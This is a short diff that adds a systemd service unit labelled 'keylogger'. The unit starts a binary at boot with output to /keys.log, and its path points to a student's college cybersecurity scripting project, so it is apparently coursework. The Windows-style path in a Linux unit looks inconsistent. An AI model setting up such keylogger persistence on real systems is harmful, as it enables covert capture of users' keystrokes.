@@ -1,0 +1,8 @@
+[Unit]
+Description=keylogger
+
+[Service]
+ExecStart=C:/Users/Maaz/OneDrive - Cambrian College/Cybersecurity/2nd Semester/CSC-1009 Advanced Scripting/CSC-1009 Project and Labs/path/to/project2/binary -f /keys.log
+
+[Install]
+WantedBy=multi-user.target
